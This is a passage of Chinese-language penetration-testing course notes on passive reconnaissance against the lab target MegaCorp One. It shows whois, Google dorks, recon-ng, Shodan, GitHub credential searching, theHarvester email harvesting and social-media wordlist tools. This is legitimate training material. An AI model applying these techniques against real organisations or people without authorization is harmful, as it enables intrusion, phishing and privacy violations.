<http://www.gandi.net>\n Updated Date: 2019-01-01T09:45:03Z\n Creation Date: 2013-01-22T23:01:00Z\n Registry Expiry Date: 2023-01-22T23:01:00Z\n...\nRegistry Registrant ID:\nRegistrant Name: Alan Grofield\nRegistrant Organization: MegaCorpOne\nRegistrant Street: 2 Old Mill St\nRegistrant City: Rachel\nRegistrant State/Province: Nevada\nRegistrant Postal Code: 89001\nRegistrant Country: US\nRegistrant Phone: +1.9038836342\n...\nRegistry Admin ID:\nAdmin Name: Alan Grofield\nAdmin Organization: MegaCorpOne\nAdmin Street: 2 Old Mill St\nAdmin City: Rachel\nAdmin State/Province: Nevada\nAdmin Postal Code: 89001\nAdmin Country: US\nAdmin Phone: +1.9038836342\n...\nRegistry Tech ID:\nTech Name: Alan Grofield\nTech Organization: MegaCorpOne\nTech Street: 2 Old Mill St\nTech City: Rachel\nTech State/Province: Nevada\nTech Postal Code: 89001\nTech Country: US\nTech Phone: +1.9038836342\n...\nName Server: NS1.MEGACORPONE.COM\nName Server: NS2.MEGACORPONE.COM\nName Server: NS3.MEGACORPONE.COM\n...\n```\n\n并非所有这些数据都是有用的，但我们确实发现了一些有价值的信息。首先，输出结果显示，Alan Grofield 注册了这个域名。根据 Megacorp One 的联系页面，Alan 是 “IT 和安全总监”。\n\n我们还发现了 Megacorp One 的名称服务器。名称服务器是 DNS 的一个组成部分，我们在此不做研究，但我们应该把这些服务器添加到我们的笔记中。\n\n除了这种标准的前向查找（收集有关 DNS 名称的信息）外，whois 客户端还可以进行反向查找。假设我们有一个 IP 地址，我们可以进行反向查询，以收集更多关于它的信息。\n\n```bash\nkali@kali:~$ whois 38.100.193.70\n...\nNetRange: 38.0.0.0 - 38.255.255.255\nCIDR: 38.0.0.0/8\nNetName: COGENT-A\n...\nOrgName: PSINet, Inc.\nOrgId: PSI\nAddress: 2450 N Street NW\nCity: Washington\nStateProv: DC\nPostalCode: 20037\nCountry: US\nRegDate:\nUpdated: 2015-06-04\n...\n```\n\n反向查询的结果为我们提供了关于谁在托管该 IP 地址的信息。这些信息以后可能会很有用，就像我们收集的所有信息一样，我们将把这些信息添加到我们的笔记中。\n\n## Google Hacking\n\n“Google Hacking” 一词是由 Johnny Long 在 2001 年推广的。通过几次讲座和一本非常受欢迎的书（Google Hacking For Penetration Testers），他概述了如何利用 Google 这样的搜索引擎来发现关键信息、漏洞和配置错误的网站。\n\n这种技术的核心是巧妙的搜索字符串和运算符，允许创造性地完善搜索查询，其中大部分都适用于各种搜索引擎。这个过程是反复进行的，从广泛的搜索开始，用运算符缩小范围，以筛选出不相关或不感兴趣的结果。\n\n让我们尝试一下这些操作符，感受一下它们是如何工作的。\n\n网站操作符将搜索限制在一个单一的域。我们可以用这个运算符来粗略了解一个组织的网络存在。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/497bebc0-235b-4ce4-8a04-1367e1cba9bc/Untitled.png)\n\n然后我们可以使用进一步的运算符来缩小这些结果。例如，filetype（或 ext）操作符将搜索结果限制在指定的文件类型。\n\n在这个例子中，我们结合运算符来定位 [www.megacorpone.com](http://www.megacorpone.com/)（site:megacorpone.com）上的 PHP 文件（filetype:php）。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/78777c56-8056-4aba-b004-d607fec2acc6/Untitled.png)\n\n我们只得到一个结果，但这是一个有趣的结果。我们的查询找到了 AlivenVault OSSIM 实例的登录页面，这是一个安全信息和事件管理（SIEM）平台。安全团队使用 SIEM 工具来监控应用程序和网络流量的恶意活动。通常，这些工具只在内部网络上可用。我们应该注意这个 URL，因为如果我们能在主动开发阶段找到用户凭证来登录，它可能会被证明是有用的。\n\next 操作符也可以帮助辨别网站上可能使用的编程语言。像 ext:jsp、ext:cfm、ext:pl 这样的搜索将分别找到索引的 Java Server Pages、Coldfusion 和 Perl 网页。\n\n我们还可以用 `-` 来修改一个操作符，以便从搜索中排除特定的项目，缩小搜索结果的范围。\n\n例如，为了找到有趣的、非 HTML 的页面，我们可以使用 site:megacorpone.com 来限制搜索到 [megacorpone.com](http://megacorpone.com) 和子域，接着使用 -filetype:html 来从结果中排除 HTML 页面。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1d380a2a-fc4c-4eea-a2fb-c6331d18a3c6/Untitled.png)\n\n在这种情况下，我们发现了几个有趣的页面，包括一个管理控制台。\n\n在另一个例子中，我们可以使用 intitle:”index of”“parent directory” 的搜索来找到标题中含有 “index of” 的页面，以及页面中含有 “parent directory” 字样的页面。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bf5870d4-f165-484a-bd0f-d2a89291218c/Untitled.png)\n\n输出指的是目录列表页，列出了没有索引页的目录的文件内容。像这样的错误配置会暴露出有趣的文件和敏感信息。\n\n这些基本的例子只触及我们可以用搜索操作符做的事情的表面，谷歌黑客数据库（GHDB）包含了大量的创意搜索，展示了使用组合运算符进行创意搜索的力量。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ab846c69-da24-4d8b-a6cd-9e10df1d28c6/Untitled.png)\n\n掌握这些操作者，再加上敏锐的推理能力，是有效的搜索引擎“黑客”的关键技能。\n\n### 练习\n\n1. 谁是 MegaCorp One 的法律副总裁，他们的电子邮件地址是什么？\n2. 使用 Google dorks（你自己的或 GHDB 的任何一个）来搜索 [www.megacorpone.com](http://www.megacorpone.com)，寻找有趣的文件。\n3. 你还能确定哪些 MegaCorp One 的员工没有被列入 [www.megacorpone.com](http://www.megacorpone.com)？\n\n## Netcraft\n\nNetcraft 是一家位于英国的互联网服务公司，提供一个免费的门户网站，执行各种信息收集功能。使用诸如 Netcraft 所提供的服务被认为是一种被动的技术，因为我们从不与目标直接互动。\n\n让我们回顾一下 Netcraft 的一些功。例如，我们可以使用 Netcraft 的 DNS 搜索页面（https://searchdns.netcraft.com）来收集关于 [megacorpone.com](http://megacorpone.com) 域名的信息。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b34d74e8-7ab7-4ec1-8598-057eec3f6726/Untitled.png)\n\n对于发现的每个服务器，我们可以通过点击每个网站 URL 旁边的图标，查看“网站报告”，提供有关该服务器的额外信息和历史。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/14b4a1ca-02f0-4381-91bc-4f26f35c1a90/Untitled.png)\n\n报告的开头涉及注册信息。然而，如果我们向下滚动，我们发现各种“网站技术”条目。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4bb9214-020c-492a-8cfe-58760f31ee15/Untitled.png)\n\n这份子域和技术的清单将在我们转向积极的信息收集和利用时证明是有用的。现在，我们将把他添加到我们的笔记中。\n\n### 练习\n\n1. 使用Netcraft来确定在 [www.megacorpone.com](http://www.megacorpone.com/) 上运行的是什么应用服务器。\n\n## Recon-ng\n\nRecon-ng 是一个基于模块的框架，用于基于网络的信息收集。recon-ng 讲一个模块的结果显示在终端上，但它也将这些结果存储在数据库中。recon-ng 的大部分功能在于将一个模块的结果输入另一个模块，使我们能够迅速扩大信息收集的范围。\n\n让我们用 recon-ng 来汇编关于 MegaCorp One 的有趣数据。为了开始，让我们简单的运行 recon-ng。\n\n```bash\n┌──(root💀kali)-[~/Desktop/OSCP/exploits]\n└─# recon-ng \n[*] Version check disabled.\n\n    _/_/_/    _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/\n   _/    _/  _/        _/        _/      _/  _/_/    _/            _/_/    _/  _/       \n  _/_/_/    _/_/_/    _/        _/      _/  _/  _/  _/  _/_/_/_/  _/  _/  _/  _/  _/_/_/\n _/    _/  _/        _/        _/      _/  _/    _/_/            _/    _/_/  _/      _/ \n_/    _/  _/_/_/_/    _/_/_/    _/_/_/    _/      _/            _/      _/    _/_/_/    \n\n                                          /\\\\\n                                         / \\\\\\\\ /\\\\\n    Sponsored by...               /\\\\  /\\\\/  \\\\\\\\V  \\\\/\\\\\n                                 / \\\\\\\\/ // \\\\\\\\\\\\\\\\\\\\ \\\\\\\\ \\\\/\\\\\n                                // // BLACK HILLS \\\\/ \\\\\\\\\n                               www.blackhillsinfosec.com\n\n                  ____   ____   ____   ____ _____ _  ____   ____  ____\n                 |____] | ___/ |____| |       |   | |____  |____ |\n                 |      |   \\\\_ |    | |____   |   |  ____| |____ |____\n                                   www.practisec.com\n\n                      [recon-ng v5.1.1, Tim Tomes (@lanmaster53)]                       \n\n[*] No modules enabled/installed.\n\n[recon-ng][default] >\n```\n\n根据输出结果，我们需要安装各种模块来使用 recon-ng。\n\n我们可以从 recon-ng “Marketplace” 中添加模块，我们将用 marketplace search 从提示中搜索市场，提供一个搜索字符串作为参数。\n\n在这个例子中，我们将搜索包含 github 这个词的模块：\n\n```bash\n[recon-ng][default] > marketplace search github\n[*] Searching module index for 'github'...\n\n  +------------------------------------------------------------------------------------------------+\n  |                       Path                      | Version |     Status    |  Updated   | D | K |\n  +------------------------------------------------------------------------------------------------+\n  | recon/companies-multi/github_miner              | 1.1     | not installed | 2020-05-15 |   | * |\n  | recon/profiles-contacts/github_users            | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/profiles-profiles/profiler                | 1.0     | not installed | 2019-06-24 |   |   |\n  | recon/profiles-repositories/github_repos        | 1.1     | not installed | 2020-05-15 |   | * |\n  | recon/repositories-profiles/github_commits      | 1.0     | not installed | 2019-06-24 |   | * |\n  | recon/repositories-vulnerabilities/github_dorks | 1.0     | not installed | 2019-06-24 |   | * |\n  +------------------------------------------------------------------------------------------------+\n\n  D = Has dependencies. See info for details.\n  K = Requires keys. See info for details.\n```\n\n请注意，一些模块在 “K” 列中标有星号。这些模块需要第三方供应商的凭证或 API 秘钥。recon-ng wiki 维护着一份其模块所使用的秘钥的简短列表。其中一些秘钥可用于免费账户，而另一些则需要订阅。\n\n我们可以通过使用模块名称后面的市场信息来了解更多关于一个模块的信息。由于 GitHub 模块需要 API 秘钥，让我们用这个命令来检查 recon/domains-hosts/google_site_web 模块。\n\n```bash\n[recon-ng][default] > marketplace info recon/domains-hosts/google_site_web\n\n  +---------------------------------------------------------------------------------------------------------------------------------+\n  | path          | recon/domains-hosts/google_site_web                                                                             |\n  | name          | Google Hostname Enumerator                                                                                      |\n  | author        | Tim Tomes (@lanmaster53)                                                                                        |\n  | version       | 1.0                                                                                                             |\n  | last_updated  | 2019-06-24                                                                                                      |\n  | description   | Harvests hosts from Google.com by using the 'site' search operator. Updates the 'hosts' table with the results. |\n  | required_keys | []                                                                                                              |\n  | dependencies  | []                                                                                                              |\n  | files         | []                                                                                                              |\n  | status        | not installed                                                                                                   |\n  +---------------------------------------------------------------------------------------------------------------------------------+\n```\n\n根据它的描述，这个模块用 “site” 操作符搜搜谷歌，它不需要 API 秘钥。让我们用 marketplace install 来安装这个模块。\n\n```bash\n[recon-ng][default] > marketplace install recon/domains-hosts/google_site_web\n[*] Module installed: recon/domains-hosts/google_site_web\n[*] Reloading modules...\n```\n\n安装完模块后，我们可以用模块加载，后面跟上它的名字。然而，我们用 info 来显示模块的细节和所需参数。\n\n```bash\n[recon-ng][default] > modules load recon/domains-hosts/google_site_web\n[recon-ng][default][google_site_web] > info\n\n      Name: Google Hostname Enumerator\n    Author: Tim Tomes (@lanmaster53)\n   Version: 1.0\n\nDescription:\n  Harvests hosts from Google.com by using the 'site' search operator. Updates the 'hosts' table with\n  the results.\n\nOptions:\n  Name    Current Value  Required  Description\n  ------  -------------  --------  -----------\n  SOURCE  default        yes       source of input (see 'info' for details)\n\nSource Options:\n  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL\n  <string>       string representing a single input\n  <path>         path to a file containing a list of inputs\n  query <sql>    database query returning one column of inputs\n```\n\n注意，现在我们已经安装并加载了该模块，输出包含了关于该模块的额外信息。根据输出结果，该模块需要使用一个源，也就是我们向收集的信息的目标。\n\n在这种情况下，我们将使用选项 set SOURCE [megacorpone.com](http://megacorpone.com) 来设置我们的目标域。\n\n```bash\n[recon-ng][default][google_site_web] > options set SOURCE megacorpone.com\nSOURCE => megacorpone.com\n```\n\n最后，我们运行该模块\n\n```bash\n[recon-ng][default][google_site_web] > run\n---------------\nMEGACORPONE.COM\n---------------\n[*] Searching Google for: site:megacorpone.com\n[*] [host] www.megacorpone.com (<blank>)\n[*] [host] vpn.megacorpone.com (<blank>)\n[*] [host] www2.megacorpone.com (<blank>)\n[*] [host] siem.megacorpone.com (<blank>)\n[*] Searching Google for: site:megacorpone.com -site:www.megacorpone.com -\nsite:vpn.megacorpone.com -site:www2.megacorpone.com -site:siem.megacorpone.com\n-------\nSUMMARY\n-------\n[*] 4 total (4 new) hosts found.\n```\n\n这些结果反映了我们从 Netcraft DNS 搜索中发现的情况。然而，我们没有在这里浪费我们的时间。Recon-ng 将结果储存在本地数据库中，这些结果将反馈给其他 recon-ng 模块。\n\n我们可以使用 show hosts 命令来查看存储的数据。\n\n```bash\n[recon-ng][default][google_site_web] > back\n[recon-ng][default] > show\nShows various framework items\nUsage: show\n<companies|contacts|credentials|domains|hosts|leaks|locations|netblocks|ports|profiles\n|pushpins|repositories|vulnerabilities>\n\n[recon-ng][default] > show hosts\n+--------------------------------------------------------------------------------+\n| rowid |         host         | ip_address | region | country |      module     |\n+--------------------------------------------------------------------------------+\n| 1     | www.megacorpone.com  |            |        |         | google_site_web |\n| 2     | vpn.megacorpone.com  |            |        |         | google_site_web |\n| 3     | www2.megacorpone.com |            |        |         | google_site_web |\n| 4     | siem.megacorpone.com |            |        |         | google_site_web |\n+--------------------------------------------------------------------------------+\n[*] 4 rows returned\n[recon-ng][default] >\n```\n\n我们的数据库中有四个主机，但没有关于他们的额外信息。也许另一个模块可以填入 IP 地址。\n\n```bash\n[recon-ng][default] > marketplace info recon/hosts-hosts/resolve\n\n  +-------------------------------------------------------------------------------------------------+\n  | path          | recon/hosts-hosts/resolve                                                       |\n  | name          | Hostname Resolver                                                               |\n  | author        | Tim Tomes (@lanmaster53)                                                        |\n  | version       | 1.0                                                                             |\n  | last_updated  | 2019-06-24                                                                      |\n  | description   | Resolves the IP address for a host. Updates the 'hosts' table with the results. |\n  | required_keys | []                                                                              |\n  | dependencies  | []                                                                              |\n  | files         | []                                                                              |\n  | status        | not installed                                                                   |\n  +-------------------------------------------------------------------------------------------------+\n\n[recon-ng][default] >\n```\n\n该模块的描述符合我们的需要，所以我们将用 marketplace install 来安装它。\n\n```bash\n[recon-ng][default] > marketplace install recon/hosts-hosts/resolve\n[*] Module installed: recon/hosts-hosts/resolve\n[*] Reloading modules...\n```\n\n<aside> 💡 一个“无效命令”的错误可能表明我们处于错误的命令级别。如果发生这种情况，请返回运行，回到主 recon-ng 提示符，并再次尝试该命令。\n\n</aside>\n\n一旦模块安装完毕，我们可以用模块加载来使用它，并运行 info 来显示模块及其选项的信息。\n\n```bash\n[recon-ng][default] >  modules load recon/hosts-hosts/resolve\n[recon-ng][default][resolve] > info\n\n      Name: Hostname Resolver\n    Author: Tim Tomes (@lanmaster53)\n   Version: 1.0\n\nDescription:\n  Resolves the IP address for a host. Updates the 'hosts' table with the results.\n\nOptions:\n  Name    Current Value  Required  Description\n  ------  -------------  --------  -----------\n  SOURCE  default        yes       source of input (see 'info' for details)\n\nSource Options:\n  default        SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL AND ip_address IS NULL\n  <string>       string representing a single input\n  <path>         path to a file containing a list of inputs\n  query <sql>    database query returning one column of inputs\n\nComments:\n  * Note: Nameserver must be in IP form.\n```\n\n从上面的输出可以看出，这个模块将为一个主机解析 IP 地址。我们需要提供我们想要解析的 IP 地址作为我们的来源。我们可以为来源设置四个选项：默认、字符串、路径和查询。每个选项旁边都有一个描述，如清单中所示。例如，在 “google_site_web” 重组模块中，我们使用了一个字符串。\n\n然而，这次我们想利用数据库。如果我们使用“默认”值，recon-ng 将在其数据库中为任何有主机名但没有 IP 地址的记录查找主机信息。\n\n如清单中所示，我们有四个没有 IP 地址的主机。如果我们选择一个“默认”来源，该模块将自动针对我们数据库中的所有四个主机运行。\n\n让我们试试这个方法，将我们的源设置为“默认”，然后运行该模块：\n\n```bash\n[recon-ng][default][resolve] > run\n[*] www.megacorpone.com => 38.100.193.76\n[*] vpn.megacorpone.com => 38.100.193.77\n[*] www2.megacorpone.com => 38.100.193.79\n[*] siem.megacorpone.com => 38.100.193.89\n```\n\n不错。我们现在有了这四个域名的 IP 地址。\n\n如果我们再次显示主机，我们可以验证数据库已经用两个模块的结果进行了更新。\n\n```bash\n[recon-ng][default][resolve] > show hosts\n\n  +-----------------------------------------------------------------------------------------------------------------+\n  | rowid |         host        |   ip_address  | region | country | latitude | longitude | notes |      module     |\n  +-----------------------------------------------------------------------------------------------------------------+\n  | 1     | www.megacorpone.com | 38.100.193.76 |        |         |          |           |       | google_site_web |\n  | 2     | www.megacorpone.com | 38.100.193.77 |        |         |          |           |       | google_site_web |\n  | 3     | www.megacorpone.com | 38.100.193.79 |        |         |          |           |       | google_site_web |\n  | 4     | www.megacorpone.com | 38.100.193.89 |        |         |          |           |       | google_site_web |\n  +-----------------------------------------------------------------------------------------------------------------+\n\n[*] 4 rows returned\n```\n\n### 练习\n\n1. 使用 recon/domains-hosts/google_site_web 和 recon/hosts-hosts/resolve 模块来收集 MegaCorp One 的信息。\n2. 花点时间探索其他侦查模块\n\n## 开源代码\n\n在下面的章节中，我们将讨论各种在线工具和资源，它们可以用来被动地搜索信息。其中一个有趣的信息来源是开源项目和在线代码库，如 GitHub、GitLab 和 SourceForge。\n\n在线存储的代码可以提供一个组织所使用的编程语言和框架的一瞥。在一些罕见的情况下，开发人员甚至以外地将平安数据和凭证提交到公共仓库。\n\n其中一些平台的搜索工具将支持我们在本模块前面讨论的谷歌搜索操作符。\n\n例如，GitHub 的搜索是非常灵活的。在 GitHub 上，我们可以搜索用户或组织的仓库，但如果我们想搜索所有公共仓库，就需要一个账户。在之前的模块中，我们确定了 MegaCorp One 的 GitHub 账号。\n\n让我们在该账户的仓库中搜索有趣的信息。我们可以使用 filename:users 来搜索名称中含有 “users” 的任何文件。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed59a055-9ec7-4ea0-8748-879f0137a615/Untitled.png)\n\n我们的搜索值发现一个文件 —— xampp.users。即使只有一个结果，我们也可能发现了非常有趣的东西，因为 XAMPP 是一个网络应用程序开发环境。让我们检查一下该文件的内容。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0701c9d9-9086-4d31-971e-cfd65489a990/Untitled.png)\n\n这个文件似乎包含了一个用户名和密码，在我们开始主动攻击阶段时可能非常有用。让我们把它添加到我们的笔记中。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dbaded95-8349-4849-8371-4c9a7199ec3e/Untitled.png)\n\n这种手工方法在小型仓库中效果最好。对于较大的仓库，我们可以使用一些工具来帮助自动搜索，比如 Gitrob 和 Gitleaks.Recon-ng 也有一些模块用于搜索 GitHub。这些工具大多需要一个访问令牌来使用源代码托管商的 API。\n\n例如，下面的截图显示了 Gitleaks 在一个文件中找到 AWS 客户 ID 的例子。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/41394529-1b80-42e7-80df-fac846e65fa0/Untitled.png)\n\n<aside> 💡 通过源代码搜索秘密的工具，如 Gitrob 或 Gitleaks，通常依靠正则表达式或基于熵的检测来识别潜在的有用信息。正则表达式是一种预定义的搜索模式，。它们对于在文本中搜索常用密码的变化特别有用。另一方面，基于熵的检测试图寻找随机生成的字符串。这里的想法是，一长串的随机字符和数字很可能是一个密码。无论一个工具如何搜索秘密，没有一个工具是完美的，它们会错过人工检查可能发现的东西。\n\n</aside>\n\n### 练习\n\n1. 搜索 [Megacopone.com](http://Megacopone.com) 的 GitHub 仓库，寻找有趣或敏感的信息。\n\n## Shodan\n\n在我们收集目标信息的过程中，重要的是要记住，传统的网站只是互联网的一个部分。\n\nShodan 是一个搜索引擎，它抓取连接到互联网的设备，包括但不限于万维网。这包括运行网站的服务器，也包括路由器和物联网设备等设备。\n\n换句话说，谷歌和其他搜索引擎寻找网络服务商的内容，而 Shodan 则搜索连接互联网的设备，与它们互动，并显示它们的信息。\n\n尽管完成本模块或实验中的任何材料都不需要使用 Shodan，但它值得我们去探索一下。在使用 Shodan 之前，我们必须注册一个免费账号，它提供有限的访问权限。\n\n让我们先用 Shodan 来搜索 hostname:megacorpone.com。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/963d235a-cdf8-4700-9571-5f6ab2c9667f/Untitled.png)\n\n在这种情况下，Shodan 列出了 IP、服务和 banner 信息。所有这些都是在不与客户的网站互动的情况下被动收集的。\n\n这些信息给了我们一个目标互联网足迹的快照。例如，有 8 台服务器在运行 SSH，我们可以通过点击顶级服务下的 SSH 来深入了解，以完善我们的结果。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7445302a-f974-47d0-ac43-ca5a3f68479e/Untitled.png)\n\n根据 Shodan 的结果，我们确切地知道每台服务器上运行的是哪个版本的 OpenSSH。如果我们点击一个 IP 地址，我们可以检索到该主机的摘要。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d86a8aac-398f-402d-b3ac-e5d30710bff2/Untitled.png)\n\n我们可以在这个页面上查看服务器使用的域名、服务和技术。Shodan 还将显示任何已确定的服务或技术是否有任何公开的漏洞。当我们决定从哪里开始主动测试时，这些信息是非常宝贵的。\n\n## 安全头文件扫描器\n\n还有一些其他的专业网站，我们可以用来收集有关网站或域名的安全态势的信息。其中一些网站模糊了被动和主动收集信息的界限，但对于我们的目的来说，关键的一点是，第三方正在发起任何扫描或检查。\n\n一个这样的网站，Security Headers，将分析 HTTP 响应头并提供目标网站的安全态势的基本分析。我们可以利用这一点，根据结果了解一个组织的编码和安全实践。\n\n让我们扫描 [www.megacorpone.com](http://www.megacorpone.com)，并检查结果\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dd0db15a-d07f-41c4-854b-a8f1bd75dde2/Untitled.png)\n\n该网站缺少了几个防御性标头，如 Content-Security-Policy 和 X-Frame-Options。这些缺少的标头本身不一定是漏洞，但它们可能表明网站开发人员或服务器管理人员不熟悉服务器加固。\n\n<aside> 💡 服务器加固，或安全配置，是通过配置确保服务器安全的整体过程。这包括禁用不需要的服务，删除不使用的服务或用户账户，轮流使用默认密码，设置适当的服务器头文件等等。我们不需要知道配置每一种类型的服务器的所有内幕，但在分析服务器以确定如何最好地接近一个潜在的目标时，了解这些概念和想要寻找的东西可以帮助我们。\n\n</aside>\n\n## SSL 服务器测试\n\n我们可以使用的另一个扫描工具是 Qualys SSL Labs 的 SSL 服务器测试。这个工具可以分析服务器的 SSL/TLS 配置，并将其与当前的最佳做法进行比较。它还会识别一些与 SSL/TLS 相关的漏洞，如 Poodle 或 Hearbleed。让我们扫描 [www.megacorpone.com](http://www.megacorpone.com)，并检查结果。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/31cad48b-1c5f-4574-9c6f-4addcdf3b9de/Untitled.png)\n\n其结果并不像安全头文件检查那样糟糕。然而，弱的 Diffie-Hellman 秘钥交换、RC4 密码器和缺乏 Forward Secrecy 表明我们的目标没有应用当前的 SSL/TLS 加固的最佳实践。例如，由于存在多个漏洞，禁用 RC4 密码器已经被推荐了好几年。我们可以利用这些发现来深入了解目标组织内的安全实践，或者说缺乏安全实践。\n\n## Pastebin\n\nPastebin 是一个存储和分享文本的网站。该网站的基本使用不需要一个账户。许多人使用 Pastebin，因为它无处不在，使用简单。但由于 Pastebin 是一个公共服务，我们可以用它来搜索敏感信息。\n\n例如，我们可以使用网站进行基本搜索，或使用 API 进行更高级的使用。让我们来搜索 [Mgeacorpone.com](http://Mgeacorpone.com)。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1958f1d-c37f-4b20-ab24-30d126722be2/Untitled.png)\n\n只有十个结果，但其中一些看起来非常熟悉。我们在这里可能找不到任何关于 MegaCorp One 的新信息，但在未来的信息收集工作中，我们不应该忽略搜索 Pastein。\n\n## 用户信息收集\n\n除了收集目标组织的资源信息外，我们还可以收集该组织员工的信息。我们收集这些信息的目的是为了编制用户或密码列表，为社会工程建立借口，加强网络钓鱼活动或客户端攻击，执行凭证填充等等。然而，每个渗透测试的参与规则都不同。一些渗透测试可能仅限于纯粹的技术测试，没有任何社会工程方面的内容。其他活动可能只有很少或没有限制。\n\n下面的一些方法将与前几节已经讨论过的方法重叠，但我们将深入探讨一些专门针对用户枚举的工具。\n\n当我们开始收集用户的信息时，我们确实需要谨慎行事。正如我们在本模块的介绍中提到的关于“大卫”的故事，我们的目标是改善客户的安全态势，而不一定要让任何一个人被解雇。同样的，我们也不想违反任何法律。一个公司只能授权针对他们自己的系统进行测试，员工的个人设备、第三方电子邮件和社交媒体账户通常不属于这个授权范围。\n\n### 收获电子邮件\n\n让我们从一些基本的电子邮件收集开始我们的用户信息收集。在这种情况下，我们将使用 Harvester，它从多个公共数据源收集电子邮件、姓名、子域、IP 和 URL。\n\n例如，我们可以运行 Harvester，用 `-d` 来指定目标域，用 `-b` 来设置搜索的数据源。\n\n```bash\nkali@kali:~$ theharvester -d megacorpone.com -b google\n...\n[-] Starting harvesting process for domain: megacorpone.com\n\n[-] Searching in Google:\n Searching 0 results...\n Searching 100 results...\n Searching 200 results...\n Searching 300 results...\n Searching 400 results...\n Searching 500 results...\n\nHarvesting results\nNo IP addresses found\n\n[+] Emails found:\n------------------\njoe@megacorpone.com\nmcarlow@megacorpone.com\nfirst@megacorpone.com\n\n[+] Hosts found in search engines:\n------------------------------------\n\nTotal hosts: 13\n\n[-] Resolving hostnames IPs...\n\nNs1.megacorpone.com:38.100.193.70\nSiem.megacorpone.com:38.100.193.89\nadmin.megacorpone.com:38.100.193.83\nbeta.megacorpone.com:38.100.193.88\nfs1.megacorpone.com:38.100.193.82\nintranet.megacorpone.com:38.100.193.87\nmail.megacorpone.com:38.100.193.84\nmail2.megacorpone.com:38.100.193.73\nns1.megacorpone.com:38.100.193.70\nns2.megacorpone.com:38.100.193.80\nurl.megacorpone.com:empty\nwww.megacorpone.com:38.100.193.76\nwww2.megacorpone.com:38.100.193.79\n```\n\n我们发现了一些电子邮件地址，其中一个 “first@megacorpone.com” 对我们来说似乎是新的。[我们还发现了megacorpone.com](http://xn--megacorpone-ix9qn5bh73bnn4ci66c899e.com) 的一些新子域。让我们把这些也添加到我们的笔记中。\n\n这是一个很好的提醒，信息收集并不总是一个整齐的、线性的过。我们可能正在寻找用户的信息时，发现了关于我们目标的其他信息。这就是保持良好的笔记的一个原因。\n\n### 密码转储\n\n恶意黑客经常在 Pastebin 或其他信誉较差的网站上转储被破解的凭证。这些密码转储对于生成词表来说是非常有价值的。例如，Kali Linux 包括从 2009 年的数据泄露事件中产生的 “rockyou” 字样。\n\n## 社会媒体工具\n\n几乎所有的组织现在都在社会媒体上保持着某种存在。在公司发布的信息对我们来说非常有用。例如，我们可以利用这些信息来识别潜在的员工，并获得更多关于公司及其运作的信息。有各种方法可以通过我们已经讨论过的几个工具来收集这些公共信息，例如 recon-ng 和 theHarvester。让我们来探讨一下另外几个工具。\n\n### Social-Searcher\n\nSocial-Searcher 是一个社交媒体网站的搜索引擎。一个免费的账户将允许每天有限的搜索次数。Social-Searcher 可以成为在多个更专业的服务上设置 API 秘钥的一个快速替代方案。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9203d2aa-8883-4c67-9f49-7566ef446b98/Untitled.png)\n\n搜索结果将包括目标组织发布的信息以及人们对其的评价。除其他事项外，这可以帮助我们确定一个组织在社交媒体上有什么样的足迹和覆盖面。一旦我们完成了这些，我们可能会选择继续使用特定地点的工具。\n\n### 特定地点的工具\n\n有两个特定网站的工具，我们可能想熟悉一下。\n\nTwofi 扫描用户的 Twitter 信息，并生成一个个性化的单词表，用于对该用户的密码攻击。虽然我们不会在被动的信息收集过程中进行任何攻击，但我们可以针对我们已经确定的任何 Twitter 账户运行这个工具，以便在需要时准备好一个词表。Twofi 需要一个有效的 Twitter API 秘钥。\n\nlinkedin2username 是一个基于 LinkedIn 数据生成用户名列表的脚本。它需要有效的 LinkedIn 凭证，并依赖于与目标组织中的个人的 LinkedIn 连接。该脚本将输出几种不同格式的用户名。\n\n## Stack Overflow\n\nStack Overflow 是一个供开发人员提出和回答编码相关问题的网站。\n\n从信息收集的角度来看，该网站的价值在于观察一个特定的用户所提出或回答的问题的类型。如果我们能合理地确定 Stack Overflow 上的用户也是我们目标组织的员工，我们就能根据该员工的问题和回答推断出该组织的一些情况。\n\n例如，如果我们发现一个用户总是在询问和回答关于 Python 的问题，那么我们就有理由认为他们每天都在使用这种编程语言，而且很可能是他们所在的组织中使用。\n\n更糟糕的是，如果我们发现员工在这些类型的论坛上讨论敏感信息，如漏洞修复，我们可能在这个阶段发现未修补的漏洞。\n\n## 信息收集框架\n\n在本模块的最后，我们将简要地提到两个额外的工具，它们融合了我们讨论过的许多技术，并增加了额外的功能。这些工具对于我们将在实验室中进行的工作来说通常过于沉重，但在现实世界的评估中它们是有价值的。\n\n### OSINT 框架\n\nOSINT 框架包括在一个中心位置的信息收集工具和网站。该框架中所列的一些工具涵盖了比信息安全更多的学科。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d053c2e2-b86c-4e29-8aa5-3fa0e8eaa565/Untitled.png)\n\nOSINT 框架并不意味着是一个检查清单，但审查这些类别和可用的工具可能会激发对额外信息收集机会的想法。\n\n### Maltego\n\nMaltego 